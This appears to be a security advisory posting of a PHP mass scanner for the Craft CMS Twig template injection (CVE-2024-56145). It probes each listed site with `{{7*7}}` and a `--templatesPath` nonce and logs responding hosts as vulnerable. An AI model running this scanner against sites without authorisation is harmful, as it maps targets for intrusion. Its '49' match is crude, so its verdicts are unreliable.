@@ -1,0 +1,148 @@
+=============================================================================================================================================
+| # Title     : Craft CMS 5.0 Twig Template Injection – Mass Scanner                                                                        |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://craftcms.com                                                                                                        |
+=============================================================================================================================================
+
+POC : 
+
+[+] Description : a Mass Scanner for detecting the Craft CMS Twig Template Injection vulnerability.  
+                  The scanner performs **NON-DESTRUCTIVE testing only**, without any RCE payloads.  
+
+(Related : https://packetstorm.news/files/cve/CVE-2024-56145 Related CVE numbers:	CVE-2024-56145 ) .
+
+[+] It detects vulnerable Craft CMS instances using:
+
+1. **Twig mathematical evaluation**  
+
+   Payload: `{{7*7}}` → Expected value: `49`
+
+2. **templatesPath injection via GET argument**  
+
+   Payload: `?--templatesPath=/RANDOM_NONCE`  
+   Expected behavior: Echo of the nonce inside the server error trace.
+
+[+] The scanner supports:
+
+✔ Large-scale mass scanning  
+✔ Output file generation  
+✔ Safe detection  
+✔ Linux / Windows / macOS support  
+
+=============================================
+# Proof-of-Concept (PHP Mass Scanner)
+=============================================
+
+<?php
+/**
+ * Craft CMS Twig Injection – Mass Scanner 
+ * Author : indoushka
+ */
+
+class CraftTwigMassScanner {
+
+    private array $targets;
+    private string $outputFile;
+
+    public function __construct(string $fileList, string $outputFile = "vulnerable.txt") {
+        if (!file_exists($fileList)) {
+            die("Targets file not found.\n");
+        }
+
+        $this->targets = array_filter(array_map("trim", file($fileList)));
+        $this->outputFile = $outputFile;
+    }
+
+    private function banner() {
+        echo "=============================================\n";
+        echo " Craft CMS Twig Injection – Mass Scanner\n";
+        echo " PoC by indoushka\n";
+        echo "=============================================\n\n";
+    }
+
+    private function http_get(string $url): string|false {
+        return @file_get_contents($url, false, stream_context_create([
+            "http" => [
+                "timeout" => 5,
+                "user_agent" => "Mozilla/5.0"
+            ]
+        ]));
+    }
+
+    private function test_injection(string $target): bool {
+        $probe = "{{7*7}}";
+        $encoded = urlencode($probe);
+
+        $url = rtrim($target, "/") . "/?template=" . $encoded;
+        $response = $this->http_get($url);
+
+        return ($response && str_contains($response, "49"));
+    }
+
+    private function test_template_path(string $target): bool {
+        $nonce = substr(md5(rand()), 0, 8);
+
+        $url = rtrim($target, "/") . "/?--templatesPath=/" . $nonce;
+        $response = $this->http_get($url);
+
+        return ($response && str_contains($response, $nonce));
+    }
+
+    private function save_vulnerable(string $target) {
+        file_put_contents($this->outputFile, $target . PHP_EOL, FILE_APPEND);
+    }
+
+    public function scan() {
+        $this->banner();
+
+        foreach ($this->targets as $target) {
+            echo "[*] Checking: $target\n";
+
+            $inj = $this->test_injection($target);
+            $path = $this->test_template_path($target);
+
+            if ($inj || $path) {
+                echo "[+] Vulnerable: $target\n";
+                $this->save_vulnerable($target);
+            } else {
+                echo "[-] Not vulnerable: $target\n";
+            }
+
+            echo "---------------------------------------------\n";
+        }
+
+        echo "\nScan completed.\n";
+        echo "Results saved in: {$this->outputFile}\n";
+    }
+}
+
+/* CLI */
+if (php_sapi_name() === "cli") {
+    if (!isset($argv[1])) {
+        die("Usage: php mass.php targets.txt\n");
+    }
+
+    $scanner = new CraftTwigMassScanner($argv[1]);
+    $scanner->scan();
+}
+?>
+
+====================
+[+] Usage
+====================
+
+php mass.php targets.txt
+
+Example targets.txt:
+http://site1.com
+https://example.org
+http://victim.net
+
+Output file:
+vulnerable.txt
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
